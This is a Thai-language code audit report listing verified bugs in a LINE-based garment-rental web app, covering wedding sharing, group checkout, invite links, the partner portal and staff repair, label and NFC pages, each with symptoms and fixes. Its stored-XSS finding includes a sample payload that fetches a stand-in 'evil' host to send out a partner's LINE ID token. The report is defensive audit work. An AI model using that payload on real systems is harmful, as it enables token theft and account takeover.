### 🟠 สำคัญ · `wed.html:161` — คลิก 'เลือกเป็นของฉัน' ส่งสถานะ 'reserved' ทันทีก่อนจองจริง — ชุดถูกล็อกเป็น 'จองแล้ว' สำหรับแขกทุกคนแม้ผู้คลิกไม่เคยจ่าย/จองสำเร็จ

wed.html:161 `await window.API.wedSharePick(CUSTOMER, SUMMARY.code, code, 'reserved')` แล้วค่อย redirect ไป g.html?code= เพื่อ 'ไปหน้าจองชุดตัวนี้' (คอมเมนต์บรรทัด 162) — คือ ณ จุดคลิกยังไม่มีการจองจริงเกิดขึ้นเลย แต่ส่ง status 'reserved' ซึ่งระบบเดียวกันนิยามเป็นสถานะ hard: wed.html:125 `const isHard = t && (t.status === 'reserved' || t.status === 'rented')` → การ์ดขึ้น badge '<ชื่อ> จองแล้ว', class 'taken' (opacity .66) และปุ่มถูกปิด `pointer-events:none` (CSS บรรทัด 33) สำหรับแขกคนอื่นทุกคน ทั้งที่ API layer ออกแบบสถานะ soft ไว้แล้ว: api.js:710 default คือ 'eyeing' (แสดงเป็น 'กำลังดู' badge soft ที่ wed.html:126) แต่หน้าไม่เคยใช้ค่านี้เลย

**อาการที่ผู้ใช้เจอ:** แขกงานแต่ง A เปิดลิงก์งาน กดดูชุด D21 ด้วยปุ่ม 'เลือกเป็นของฉัน' แล้วเปลี่ยนใจปิดหน้า g.html ไม่จองต่อ → แขก B, C ที่เปิดลิงก์เดียวกันเห็น D21 ขึ้น 'A จองแล้ว' ปุ่มกดไม่ได้ถาวร ทั้งที่ชุดยังว่างจริง — ชุดสวย ๆ ในงานถูกบล็อกจากการคลิกเล่นครั้งเดียว และร้านเสียยอดเช่า

**แนวทางแก้:** ส่ง 'eyeing' ตอนคลิก (`wedSharePick(CUSTOMER, SUMMARY.code, code, 'eyeing')` หรือไม่ส่ง p_status ให้ใช้ default) แล้วให้ g.html/backend อัปเดตเป็น 'reserved' เมื่อจองสำเร็จจริงเท่านั้น

### 🟠 สำคัญ · `group-checkout.html:741` — สลับโหมดจ่าย (host ↔ split) หลังเลือกชุดแล้ว UI หลุด sync กับ state — ชุดที่เลือกไว้ไม่โชว์ติ๊กถูก แต่ summary ยังนับและกดจองได้

setPayMode (group-checkout.html:821-826) เรียก renderAssign() ใหม่ทั้งก้อนโดยตั้งใจไม่ล้าง SEL/SHIP (คอมเมนต์บรรทัด 824 บอกว่าเก็บไว้สลับกลับได้) แต่ renderAssign สร้าง HTML ของการ์ดชุดที่ :741-748 `<div class="pick" data-w=... onclick=...>` โดยไม่เติม class 'sel' ตามค่าใน SEL, ไม่เติม class 'has' ให้ .look (:730), ไม่เติมข้อความ 'เลือกแล้ว' ใน #lpick- (:734) และ .shipctl ไม่ได้ class 'show' (:752,:757) — สถานะพวกนี้ถูกเติมเฉพาะใน pickOne (:776-795) เท่านั้น ผลคือหลัง re-render: SEL ยังมีค่าเดิม → refreshSummary (:860-866) โชว์ 'เลือกแล้ว N ชุด' และ bookBtn เปิด แต่ไม่มีการ์ดไหนขึ้นติ๊กถูก และแถวเลือกวิธีส่ง/ที่อยู่กล่องแยกที่เคยเปิดไว้หายไปจนกว่าจะแตะชุดใหม่ ยิ่งกว่านั้นถ้าผู้ใช้แตะการ์ดที่ (มองไม่เห็นว่า) เลือกไว้แล้ว pickOne จะ toggle เป็น 'ยกเลิก' (:777) — ดูเหมือนกดเลือกแต่จำนวนใน summary ลดลง

**อาการที่ผู้ใช้เจอ:** ผู้ใช้จัดตีม เลือกชุดครบ 3 คน แล้วลองสลับปุ่ม 'ต่างคนต่างจ่าย' → ติ๊กถูกทั้งหมดหายจากจอ แต่แถบล่างยังเขียน 'เลือกแล้ว 3 ชุด' และปุ่มยืนยันยังกดได้ ผู้ใช้งงว่าเลือกอะไรไว้ กดการ์ด D21 ซ้ำเพื่อ 'เลือก' → กลายเป็นยกเลิก เหลือ 2 ชุด → เสี่ยงกดยืนยันจองโดยไม่รู้ว่ารายการจริงคือชุดไหนบ้าง

**แนวทางแก้:** ใน renderAssign เติมสถานะจาก state ตอนสร้าง HTML: `class="pick ${SEL[id]===p.code?'sel':''}"`, `class="look ${SEL[id]?'has':''}"`, lpick text และ `class="shipctl ${SEL[id]?'show':''}"`

### 🟠 สำคัญ · `family.html:445` — กด Cancel ตอนตั้งชื่อกลุ่มใหม่ → ระบบยังสร้างกลุ่มจริงชื่อ 'กลุ่มใหม่' (เช็ค null หลัง || '' เป็น dead code)

createGroupFlow (family.html:443-458): บรรทัด 444 `const name = (prompt(...)||'').trim();` แปลง null (กรณีผู้ใช้กด Cancel) เป็น '' ไปแล้ว → บรรทัด 445 `if(name===null) return;` ไม่มีทางเป็นจริง (dead check) → โค้ดวิ่งต่อและใน LIVE เรียก `window.API.createGroup(ME, name||NAV.t('กลุ่มใหม่','New group'), 'family')` (:448) สร้างกลุ่มจริงใน DB พร้อมสลับ active ไปกลุ่มนั้น (mock ก็ push กลุ่มปลอมเช่นกันที่ :454-456)

**อาการที่ผู้ใช้เจอ:** ผู้ใช้กดปุ่ม '+ สร้างกลุ่มใหม่' แล้วเปลี่ยนใจกด Cancel ใน prompt → เกิดกลุ่มเปล่าชื่อ 'กลุ่มใหม่' โผล่ใน switcher ทันทีและถูกบันทึกจริงใน Supabase — กดยกเลิกหลายครั้งได้กลุ่มขยะหลายกลุ่ม และหน้านี้ไม่มี UI ลบกลุ่ม (groupDelete มีใน api.js แต่ไม่ถูกเรียกจากหน้านี้) ผู้ใช้ลบทิ้งเองไม่ได้

**แนวทางแก้:** แยกเช็ค cancel ก่อน: `const raw = prompt(...); if(raw===null) return; const name = raw.trim();`

### 🟡 ย่อย · `family.html:965` — ลิงก์ชวนเข้ากลุ่มที่หมดอายุ/ไม่ถูกต้อง ล้มเหลวแบบเงียบ — join_group ไม่เช็ค data.error (mapping 'expired' ใน friendlyErr ไม่มีทางถูกใช้)

RPC ผ่าน me-rpc gateway คืน error ระดับข้อมูลมาใน data (เช่น {error:'expired'}) โดย transport error เท่านั้นที่อยู่ใน res.error (me-api.js:47-57 คืน error เฉพาะเมื่อ !r.ok/out.error ระดับ gateway) และ unwrap() ของ family.html:382-386 โยนเฉพาะ res.error — โค้ดหน้าเดียวกันรู้ convention นี้ดี: เส้นทาง groupInvite เช็ค `if(data && data.error)` ที่ :898 แต่เส้นทางลิงก์เชิญ ?join=<token> ที่ :963-969 ทำแค่ `const r=unwrap(await window.API.joinGroup(token, ME)); ... if(r && r.group_id) ...` → ถ้า backend คืน {error:'expired'} (มี mapping รออยู่ใน friendlyErr:918 แต่ unreachable เพราะ catch ที่ :969 รับเฉพาะ exception จาก transport) จะไม่มี alert/toast ใด ๆ, URL ถูก clean ทิ้ง (cleanJoinFromUrl) เหมือนไม่มีอะไรเกิดขึ้น อาการเดียวกันที่ openInvite :845-848: unwrap(groupJoinToken) ไม่เช็ค data.error → ถ้า backend คืน {error:'not_owner'} จะได้ `token=''` แล้วประกอบ URL `https://liff.line.me/<LIFF_ID>/join.html?token=` โชว์เป็นลิงก์พร้อมแชร์ทาง LINE ทั้งที่ใช้งานไม่ได้

**อาการที่ผู้ใช้เจอ:** เพื่อนแตะการ์ดชวนใน LINE ที่หัวหน้ากลุ่มส่งไว้เมื่อสัปดาห์ก่อน (token หมดอายุ) → LIFF เปิด family.html, ล็อกอินผ่าน, แล้ว... ไม่มีข้อความอะไรเลย เห็นแค่กลุ่มของตัวเอง ไม่รู้ว่าการเข้าร่วมล้มเหลวหรือสำเร็จ — และสมาชิกธรรมดา (ไม่ใช่ owner) ที่กด 'ชวนเพื่อน' อาจได้ลิงก์ token ว่างไปแชร์ให้เพื่อนกดแล้วเข้ากลุ่มไม่ได้

**แนวทางแก้:** หลัง unwrap ให้เช็ค data.error เหมือนเส้นทาง groupInvite: `if(r && r.error){ toast(friendlyErr(r.error)); }` ทั้งใน joinGroup (:965) และ groupJoinToken (:845 — ถ้า error ให้โชว์ 'สร้างลิงก์ไม่สำเร็จ' แทนการประกอบ URL token ว่าง)

### 🟡 ย่อย · `wed.html:44` — wed.html หลุดจากระบบ i18n และ topbar ทั้งหน้า — ผู้ใช้ EN เห็นไทยล้วน ไม่มีปุ่มสลับภาษา/ปุ่มย้อนกลับ

wed.html โหลด nav.js?v=1 (:53) เหมือนหน้าอื่นในกลุ่ม แต่ทั้งไฟล์ไม่มี data-i18n / NAV.t แม้แต่จุดเดียว (ทุกข้อความ hardcode ไทย เช่น 'ชวนเพื่อนเช่าชุดเข้างานเดียวกัน' :85, 'เพื่อนเลือกแล้ว' :136, 'กำลังโหลด…' :44, alert :113) และไม่มี `<header class="lloop-topbar">` (nav.js render topbar เฉพาะ element ที่มี class นี้ — เทียบ family.html:154, event.html:103, group-checkout.html:206 ที่มีครบ) ขณะที่หน้ากลุ่มอื่นทั้งสามหน้าแปล EN ครบและมี back-link

**อาการที่ผู้ใช้เจอ:** ผู้ใช้ที่สลับภาษาเป็น EN ไว้จากหน้า family.html เปิดลิงก์งานแต่งของเพื่อน (wed.html?code=XXX) → เจอหน้าไทยล้วน ไม่มีปุ่ม EN ให้สลับ และไม่มีปุ่มย้อนกลับไปหน้าหลัก ต้องใช้ back ของเบราว์เซอร์/ปิด LIFF เอง

**แนวทางแก้:** เพิ่ม <header class="lloop-topbar" data-back="index.html" ...> และครอบข้อความ static ด้วย data-i18n / ข้อความใน JS ด้วย NAV.t(th,en) ตามแพตเทิร์นของ event.html


## พาร์ทเนอร์ช่างแก้ชุด (partner) + คนสมัครงาน (join)  — กลุ่ม `partner`

ยืนยัน 7 ประเด็น (verifier หักล้างทิ้ง 0 ข้อ)

### 🔴 วิกฤต · `join.html:171` — join.html ไม่โหลด data.js → API.init() พัง (window.MOCK undefined) → หน้าเชิญเข้ากลุ่มไม่เคยเข้าโหมด LIVE และกดเข้าร่วมไม่ได้เลย

join.html โหลดสคริปต์แค่ supabase-js, LIFF SDK, config.js, liffAuth.js, me-api.js, api.js, nav.js (บรรทัด 171–177) — ไม่มี data.js ทั้งที่ api.js init() (api.js:69) เขียน `let customer = window.MOCK.CUSTOMER;` แบบไม่มี guard และ window.MOCK ถูกนิยามเฉพาะใน data.js (data.js:2) เท่านั้น. เมื่อ CONFIG.USE_MOCK=false โค้ดจะเลย early-return แล้วชน TypeError (`Cannot read properties of undefined (reading 'CUSTOMER')`) ทุกครั้ง → ถูก catch ที่ join.html:343 → LIVE=false เสมอ. ผลคือ (1) หน้า preview แสดง MOCK_PREVIEW (กลุ่ม 'ครอบครัวของฉัน', ผู้ชวน 'น้ำหวาน', รูป pravatar.cc — join.html:186-189) แทนข้อมูลกลุ่มจริงจาก token, (2) CUSTOMER ไม่ถูก set แม้ล็อกอิน LINE อยู่แล้วในแอป → doJoin (join.html:300) เข้าเงื่อนไข !CUSTOMER → เรียก LiffAuth.signIn() ซึ่ง logout+login วนใหม่ (liffAuth.js:41-42) กลับมาก็พังแบบเดิม → วนไม่รู้จบ ไม่มีทางเรียก API.joinGroup ได้. หน้าอื่นที่ใช้ API.init (family.html:271, index.html:1277) โหลด data.js ทุกหน้า — join.html หน้าเดียวที่หลุด.

**อาการที่ผู้ใช้เจอ:** เพื่อนได้ลิงก์เชิญ https://liff.line.me/<LIFF_ID>/join.html?token=... เปิดในแอป LINE (ล็อกอินอัตโนมัติแล้ว) → เห็นชื่อกลุ่ม/ผู้ชวนปลอมจาก mock ('น้ำหวาน' + รูป pravatar) แทนกลุ่มจริง → กด 'เข้าร่วมกลุ่ม' → ถูกเด้ง logout/login LINE วนซ้ำไม่รู้จบ ไม่มีใครเข้ากลุ่มผ่านลิงก์เชิญได้เลย

**แนวทางแก้:** เพิ่ม <script src="data.js?v=38"></script> ก่อน api.js ใน join.html (หรือแก้ api.js ให้ guard `window.MOCK||{}` ที่ init/บรรทัด 69,111)

### 🟠 สำคัญ · `join.html:302` — กด Join แล้วต้องล็อกอิน LINE → redirectUri ตัด ?token ทิ้ง → กลับมาเจอ 'ยังไม่มีคำเชิญ'

doJoin (join.html:300-305) เรียก window.LiffAuth.signIn() เมื่อยังไม่มี CUSTOMER. signIn ใช้ `liff.login({ redirectUri: baseUrl() })` โดย baseUrl() = location.origin + location.pathname (liffAuth.js:11) — ตัด query string ทั้งหมด รวม ?token=<invite token>. หลัง LINE login เสร็จ ผู้ใช้กลับมาที่ join.html เปล่า ๆ → readToken() (join.html:206-216) คืน null → showEdge 'ยังไม่มีคำเชิญ' (join.html:350-353). token ไม่ได้ถูก stash ไว้ที่ไหน (ไม่มี sessionStorage/liff.state ขากลับ).

**อาการที่ผู้ใช้เจอ:** เพื่อนเปิดลิงก์เชิญบนเบราว์เซอร์นอกแอป LINE (เช่นกดจากแชตบน desktop) → เห็นหน้า welcome → กด 'เข้าร่วมกลุ่ม' → ไปหน้า LINE login → ล็อกอินสำเร็จกลับมา → เจอหน้า 'ยังไม่มีคำเชิญ — ลิงก์นี้ไม่มีรหัสคำเชิญ' ทั้งที่เพิ่งกดจากลิงก์ที่มี token

**แนวทางแก้:** ก่อน signIn ให้เก็บ token ลง sessionStorage แล้วอ่านคืนใน readToken หรือส่ง redirectUri เป็น location.href (คง query ไว้)

### 🟠 สำคัญ · `partner.html:845` — Stored XSS ในพอร์ทัลพาร์ทเนอร์: ชื่อ LINE / โน้ตจองของลูกค้า ถูกฉีดเข้า innerHTML โดยไม่ escape (loadClients / loadCalendar / loadBookings)

ค่าที่ลูกค้าควบคุมได้ถูกต่อสตริงเข้า innerHTML ตรง ๆ 3 จุด: (1) loadBookings บรรทัด 845-846 — `'<div class="bt">'+(b.customer||'ลูกค้า')+...` และ `b.customer_note` (ข้อความอิสระที่ลูกค้าพิมพ์ตอนจองใน app.js #stNote) ไม่ escape; (2) loadClients บรรทัด 708-709 — `c.name` (LINE display name) และ `c.headline` ไม่ escape; (3) loadCalendar บรรทัด 805 — `s.customer` ไม่ escape. ขณะที่ loadHistory (บรรทัด 939) มีฟังก์ชัน esc() และ escape ทุกค่าอย่างถูกต้อง — แสดงว่าเป็นการหลุดของ 3 จุดนี้ ไม่ใช่ design. เทียบ join.html ที่ escHtml ชื่อผู้ชวนครบ (join.html:251).

**อาการที่ผู้ใช้เจอ:** ลูกค้าตั้งชื่อ LINE เป็น `<img src=x onerror=fetch('https://evil/?t='+liff.getIDToken())>` แล้วกดจองคิวสไตลิสต์ (หรือพิมพ์ payload ในช่องโน้ตถึงสไตลิสต์) → พาร์ทเนอร์เปิดแท็บ 'คิวจอง'/'ลูกค้า'/'เวลาว่าง' → สคริปต์รันในพอร์ทัลพาร์ทเนอร์ ขโมย LINE idToken ของพาร์ทเนอร์ไปยิง me-rpc แก้/อ่านข้อมูลลูกค้าคนอื่นได้

**แนวทางแก้:** ใช้ฟังก์ชัน esc() เดียวกับ loadHistory ครอบ b.customer, b.customer_note, b.code, c.name, c.headline, s.customer ก่อนใส่ innerHTML (หรือสร้าง element แล้ว set textContent)

### 🟡 ย่อย · `ops-partner.html:55` — ฝั่ง owner ไม่มีที่แสดงข้อมูลสมัครพาร์ทเนอร์เลย — field จาก partner_self_register (IG/TikTok, service modes, พิกัดแผนที่/รหัสไปรษณีย์, specialties, เบอร์โทร) ส่งขึ้นไปแล้วหายเงียบ

partner.html:680-685 ส่ง p_data = { name, org, phone, area, postal, place_name, lat, lng, service_modes, specialties, socials:{ig,tiktok} } ผ่าน RPC partner_self_register (ฟีเจอร์จาก commit e0870cb + eb1bb05). แต่ ops-partner.html — หน้าเดียวใน ops-menu ที่ label 'พาร์ทเนอร์' roles:['owner'] (ops-menu.js:45) — เป็นแค่ฟอร์ม profiler ลูกค้าเวอร์ชันภายใน (partner_lookup/partner_get/partner_save) ไม่มี UI ดูรายชื่อพาร์ทเนอร์/ผู้สมัครแม้แต่บรรทัดเดียว. grep ทั้ง repo ยืนยันไม่มีไฟล์ไหน render คีย์ service_modes / socials / tiktok / place_name / postal ของพาร์ทเนอร์เลย (hit อื่นเป็นคนละ context: marketing/live/influencers). แม้ settings.html:126 มีสวิตช์ partner_self_register_enabled ให้ owner เปิดรับสมัคร แต่เปิดแล้ว owner ไม่มีหน้าไหนเห็นว่าใครสมัคร ใช้ช่องทางไหน อยู่ที่ไหน IG/TikTok อะไร

**อาการที่ผู้ใช้เจอ:** owner เปิดสวิตช์รับสมัครพาร์ทเนอร์ใน settings → ช่างแก้ชุด/สไตลิสต์สมัครผ่าน partner.html กรอก IG, TikTok, โหมดบริการ, ปักหมุดสตูดิโอ, รหัสไปรษณีย์ครบ → owner เปิดเมนู 'พาร์ทเนอร์' (ops-partner.html) เจอแต่ฟอร์มค้นรหัสลูกค้า — ไม่มีทางเห็น/ตรวจสอบ/ติดต่อผู้สมัครจากหลังบ้านเลย ข้อมูลที่เก็บมาไม่ถูกสะท้อนที่ไหน

**แนวทางแก้:** เพิ่มส่วน 'ผู้สมัคร/รายชื่อพาร์ทเนอร์' ใน ops-partner.html (RPC list ผ่าน ops-rpc) ที่แสดง name, org, phone, area+postal, ลิงก์แผนที่จาก lat/lng, service_modes, specialties, socials.ig/tiktok

### 🟡 ย่อย · `partner.html:565` — Gate จำแนก error 'redirecting_to_login' ผิด → พาร์ทเนอร์ที่ยังไม่ล็อกอินถูกบอกว่า 'ยังไม่พบสัญญาที่ลงนาม'

initGate ใช้ regex `/LINE|เข้าสู่ระบบ|idToken|unauthorized|เซสชัน/i` (บรรทัด 565) ตรวจว่า error เป็นเรื่องล็อกอินหรือไม่ แต่ me-api.js คืน error.message = 'redirecting_to_login' (me-api.js:38,41,50) ซึ่งไม่ match สักคำ (ไม่มีสตริง 'line' ใน 'redirecting_to_login'). กรณี reauth ถูก guard ไว้แล้ว (sessionStorage 'meReauthTried' — me-api.js:24 คืน false โดยไม่ redirect) meRpc จะคืน 'redirecting_to_login' โดยไม่พาไปล็อกอินจริง → needLogin=false, data=null → ตกไป else สุดท้าย แสดง 'ยังไม่พบสัญญาที่ลงนาม — พอร์ทัลนี้เปิดให้พาร์ทเนอร์ที่ลงนามสัญญาแล้วเท่านั้น' (บรรทัด 584-585) ทั้งที่ปัญหาจริงคือยังไม่ได้ล็อกอิน LINE

**อาการที่ผู้ใช้เจอ:** พาร์ทเนอร์เปิด partner.html บนเบราว์เซอร์นอกแอป LINE → ถูกเด้งไปหน้า LINE login แล้วกดยกเลิก/ล็อกอินไม่สำเร็จ → กลับมาหน้าเดิม (meReauthTried ถูก set แล้ว) → เจอข้อความ 'ยังไม่พบสัญญาที่ลงนาม ... ติดต่อทีม LLOOP' ค้างถาวรทั้ง session ทั้งที่เขาลงนามสัญญาแล้ว แค่ยังไม่ล็อกอิน — ทำให้เข้าใจผิดและทักหาทีมงานโดยไม่จำเป็น

**แนวทางแก้:** เพิ่ม 'redirecting_to_login' (หรือ 'login') เข้า regex needLogin หรือให้ me-api คืน error code แยก (เช่น {code:'need_login'}) แล้ว gate เช็ค code ตรง ๆ

### 🟡 ย่อย · `ops-partner.html:273` — lookup() ฝั่ง ops ทิ้ง error จาก opsRpc → staff ที่ไม่มีสิทธิ์/เซสชันหมดอายุเห็น 'ไม่พบรหัส' แทน error จริง + หน้าไม่มี role gate ของตัวเอง

บรรทัด 273: `const { data } = await sb.rpc('partner_lookup',{ p_code: c });` — ไม่ destructure error. เมื่อ ops-rpc ตอบ no_access ('ไม่มีสิทธิ์ใช้งานหลังบ้าน') / unauthorized / owner_only (ops-api.js:41-42) data จะเป็น null → โค้ดตกเข้าเงื่อนไข `!data||!data.found` → โชว์ 'ไม่พบรหัส BA4145' สีแดง ซึ่งผิดสาเหตุ (เทียบ partner.html:914 ที่เช็ค error และโชว์ error.message ก่อน). นอกจากนี้ ops-partner.html ถูกซ่อนในเมนูเป็น owner-only (ops-menu.js:45) แต่ตัวหน้าเองมีแค่ opsLogin (เช็ค LINE login — ops-api.js:15-27) ไม่เช็ค role/is_owner ก่อนโชว์ฟอร์ม — การกันสิทธิ์เป็นแบบซ่อนเมนู + พึ่ง gateway ล้วน ๆ

**อาการที่ผู้ใช้เจอ:** พนักงาน role care พิมพ์ URL ops-partner.html ตรง ๆ (หรือ owner ที่เซสชัน LINE หมดอายุ) → หน้าเปิดฟอร์มเต็มตามปกติ → ค้นรหัสลูกค้าที่มีจริง → ได้ข้อความ 'ไม่พบรหัส XXXX' ทำให้เข้าใจว่ารหัสผิด/ลูกค้าไม่มีในระบบ ทั้งที่จริงคือไม่มีสิทธิ์หรือต้องล็อกอินใหม่ — ไล่หาสาเหตุผิดทาง

**แนวทางแก้:** destructure { data, error } แล้วถ้า error ให้โชว์ error.message ในกล่อง found (เหมือน partner.html) และ/หรือเรียก opsMe() ตอนเปิดหน้าเพื่อ gate role ก่อนเปิดฟอร์ม

### 🟡 ย่อย · `partner.html:840` — i18n: ข้อความที่ render แบบ dynamic ไม่ถูกแปลแม้มีคำแปลอยู่ใน PARTNER_EN แล้ว — โหมด EN แสดงไทยปน

เอนจินแปลทำงานโดย collectI18n() เก็บ dataset.th จาก DOM ครั้งเดียวตอนโหลด (บรรทัด 1243-1255) แล้ว applyLang() แปลเฉพาะ element ที่เก็บไว้ แต่เนื้อหาที่ฉีดทีหลังด้วย innerHTML ไม่ผ่าน tr() เลย ทั้งที่หลายคีย์มีคำแปลใน PARTNER_EN อยู่แล้ว เช่น empty states 'ยังไม่มีคิว — เปิดเวลาว่างไว้...' (บรรทัด 840), 'ยังไม่มีช่องเวลา — เพิ่มด้านบนได้เลย' (795), 'ยังไม่มีลูกค้าที่บันทึก — ค้นหาด้วยรหัสด้านล่างเพื่อเริ่ม' (700, มีคีย์ที่ 1153), ป้ายในแถวปฏิทิน 'จองแล้ว'/'ว่าง'/'ลบ' (804-806), ปุ่มคิว 'กรอกผลวิเคราะห์'/'เสร็จงาน'/'ยกเลิก' (849-851), earnings 'รอจ่าย'/'จ่ายแล้ว'/'ครั้ง' (827-829), ข้อความ gate ทั้งหมด (577-585), ฟอร์มสมัครพาร์ทเนอร์ทั้งก้อน (183-225) และ toast ทุกตัว — มีเพียง renderHero ที่เรียก tr() (906)

**อาการที่ผู้ใช้เจอ:** พาร์ทเนอร์ต่างชาติสลับเป็น EN บนหัวหน้า → หัวข้อ/label ฟอร์มเป็นอังกฤษ แต่พอเปิดแท็บ 'Bookings'/'Availability' รายการคิว ปุ่ม action สถานะช่องเวลา และ empty state ทั้งหมดยังเป็นภาษาไทย อ่านไม่ออกว่าปุ่มไหนคือ Done/Cancel

**แนวทางแก้:** ครอบสตริง dynamic ทั้งหมดด้วย tr(...) ตอนสร้าง innerHTML (คีย์ส่วนใหญ่มีใน PARTNER_EN อยู่แล้ว) และเพิ่มคีย์ที่ขาด (gate, ฟอร์มสมัคร, ปุ่มคิว, toast)


## พนักงาน ops role "care" และ "stock"  — กลุ่ม `ops-care-stock`

ยืนยัน 10 ประเด็น (verifier หักล้างทิ้ง 0 ข้อ)

### 🟠 สำคัญ · `intake.html:160` — AI ช่วยกรอก (intake-tagger) ส่ง Authorization header ผิด — ขาดช่องว่างหลัง Bearer

intake.html:160 สร้าง header ว่า `Authorization:'Bearer'+SUPABASE_KEY` ได้ค่า `Bearersb_publishable_...` (ไม่มีช่องว่าง) ซึ่ง Supabase functions gateway จะ reject เป็น 401 เสมอ ทำให้ `if(!r.ok) throw` เข้า catch ทุกครั้ง เทียบกับ seller.html:194 ที่เขียนถูก: `Authorization:'Bearer '+SUPABASE_KEY` — พิสูจน์ว่าเป็น typo ไม่ใช่ดีไซน์

**อาการที่ผู้ใช้เจอ:** พนักงาน care/stock กดปุ่ม 'AI ช่วยกรอกจากรูป' ในหน้ารับเข้า จะเจอ alert 'AI ช่วยกรอกยังไม่พร้อม — ต้องตั้ง Anthropic key + deploy ฟังก์ชัน...' ตลอดไป แม้ฟังก์ชัน intake-tagger จะ deploy แล้วก็ตาม (หน้า seller ใช้งานได้แต่หน้า intake ใช้ไม่ได้)

**แนวทางแก้:** เปลี่ยนเป็น Authorization:'Bearer '+SUPABASE_KEY (เพิ่มช่องว่าง) ให้เหมือน seller.html:194

### 🟠 สำคัญ · `repair.html:268` — กด Cancel ใน prompt 'ซ่อมไม่ได้' แล้วระบบยังบันทึกซ่อมไม่ได้ + แจ้งเจ้าของอยู่ดี (null-check ตาย)

repair.html:268: `const reason=prompt('เพราะอะไรถึงซ่อมไม่ได้','')||''; if(reason===null) return;` — เพราะ `||''` ทำให้ reason ไม่มีทางเป็น null เช็ค `reason===null` เป็น dead code เมื่อผู้ใช้กด Cancel (prompt คืน null) โค้ดจะวิ่งต่อไปเรียก `sb.rpc('repair_cant',{p_code:code,p_reason:''})` ทันที ลำดับ `||''` ต้องอยู่หลังเช็ค null ไม่ใช่ก่อน ปัญหาเดียวกันที่ done() บรรทัด 263-264: กด Cancel ใน prompt ค่าซ่อมจริง → actual=null → ยังเรียก repair_complete ปิดงานซ่อมทั้งที่ผู้ใช้ตั้งใจยกเลิก

**อาการที่ผู้ใช้เจอ:** พนักงาน care กดปุ่ม 'ซ่อมไม่ได้' ในคิวงานซ่อมโดยไม่ตั้งใจ แล้วกด Cancel ใน prompt เพื่อยกเลิก — ชุดกลับถูกบันทึกสถานะ 'ซ่อมไม่ได้' พร้อม toast 'แจ้งเจ้าของแล้ว' ด้วยเหตุผลว่างเปล่า สถานะชุดเพี้ยนและเจ้าของได้รับแจ้งเตือนผิด ๆ

**แนวทางแก้:** cant(): `const reason=prompt(...); if(reason===null) return;` แล้วค่อย `|| ''` ตอนส่ง · done(): `const actual=prompt(...); if(actual===null) return;`

### 🟠 สำคัญ · `labels.html:63` — QR บนป้ายชุด (labels.html) และสติ๊กเกอร์เตรียมส่ง (shipout.html) ชี้ URL ที่เปิดไม่ได้: โดเมนยังไม่ผูก DNS + รูปแบบ path ผิด

labels.html:63 `QR_BASE='https://lloop.app/g/'` และ shipout.html:136-137 `new QRCode(...,{text:'https://lloop.app/g/'+g.code})` — ผิด 2 ชั้น: (1) lloop.app ยังไม่ผูก DNS ยืนยันจาก comment ใน intake.html:134 และ care-label.html:97 ('lloop.app ยังไม่ผูก DNS') (2) แม้ผูกแล้ว GitHub Pages ไม่มี route `/g/<code>` (ใน repo ไม่มีโฟลเดอร์ g/) — หน้าเช่าชุดจริงคือ g.html รับ query `?c=` หรือ `?code=` (g.html:116,132) ขณะที่ intake.html:134 ใช้ base ที่ถูกต้องแล้ว: `https://wearlloop-dotcom.github.io/g.html?c=` เกิดความไม่สอดคล้อง: ป้ายจาก intake สแกนได้ แต่ป้ายจาก labels/shipout สแกนไม่ได้ (staff ที่ใช้ scanInto ยังใช้ได้เพราะ scan.js:9 แกะ code จาก '/g/' เอง แต่ลูกค้าใช้กล้องมือถือธรรมดา)

**อาการที่ผู้ใช้เจอ:** ลูกค้าได้รับกล่องพร้อมสติ๊กเกอร์ 'สแกนดูชุด/ไทม์ไลน์' จากหน้าเตรียมส่ง หรือป้าย QR ที่ปริ้นจาก labels.html — สแกนแล้วเจอ DNS error / 404 แทนที่จะเห็นหน้าชุด ขณะที่ป้ายจากหน้ารับเข้า (intake) สแกนได้ปกติ

**แนวทางแก้:** เปลี่ยน QR_BASE ใน labels.html และ URL ใน shipout.html:136-137 ให้ใช้ 'https://wearlloop-dotcom.github.io/g.html?c=' เหมือน intake.html/care-label.html (scan.js รองรับ 'garment='/'?c=' อยู่แล้วผ่าน branch url ทั่วไป — หรือเพิ่ม parse '?c=' ใน scan.js ด้วย)

### 🟠 สำคัญ · `nfc.html:133` — NFC tag เขียน URL ลูกค้าด้วยพารามิเตอร์ ?g= ที่ไม่มีโค้ดฝั่งลูกค้ารองรับ (ต้องเป็น ?garment=) + โดเมนตาย

nfc.html:133 `w.write({records:[{recordType:'url',data:CUSTOMER_SITE+'/?g='+encodeURIComponent(code)}]})` โดย CUSTOMER_SITE='https://lloop.app' (บรรทัด 105) — deep-link ฝั่งลูกค้าใน app.js:3870 อ่านเฉพาะ `qs.get('garment')` (รวมถึง 'look','ref','date') ไม่มีที่ไหนใน index.html/app.js อ่าน `?g=` เลย และ scan.js:10 ก็ parse เฉพาะ 'garment=' ไม่ใช่ 'g=' บวกกับ lloop.app ยังไม่ผูก DNS (intake.html:134)

**อาการที่ผู้ใช้เจอ:** พนักงานผูก tag ที่หน้า NFC แล้วคาดว่า 'ลูกค้าแตะเฉย ๆ มือถือเด้งหน้าชุด' (comment บรรทัด 132) — ลูกค้าแตะ tag จริง มือถือเปิด https://lloop.app/?g=g1 → ตอนนี้ DNS error และแม้ DNS มาแล้วก็ได้แค่หน้าแรกเปล่า ๆ เพราะไม่มีโค้ดอ่าน ?g= ชุดไม่ถูกเปิด

**แนวทางแก้:** เปลี่ยนเป็น CUSTOMER_SITE ที่ออนไลน์จริง (wearlloop-dotcom.github.io) และใช้พารามิเตอร์ '?garment='+code ให้ตรงกับ routeDeepLink ใน app.js

### 🟡 ย่อย · `shipout.html:84` — ลิงก์ 'ต้องส่งวันนี้' จาก today.html ส่ง ?code= มาแต่ shipout.html ไม่อ่านพารามิเตอร์ทิ้งเปล่า

today.html:115 สร้างลิงก์ `'/shipout.html?code='+encodeURIComponent(x.code)` แต่สคริปต์ทั้งหมดของ shipout.html (บรรทัด 73-149) ไม่มี URLSearchParams / location.search เลย — มีแค่ input + ปุ่ม 'เตรียม' + Enter listener เทียบกับ garment.html:122 ที่รองรับ pattern นี้ (`new URLSearchParams(location.search).get('code')` แล้ว auto-load)

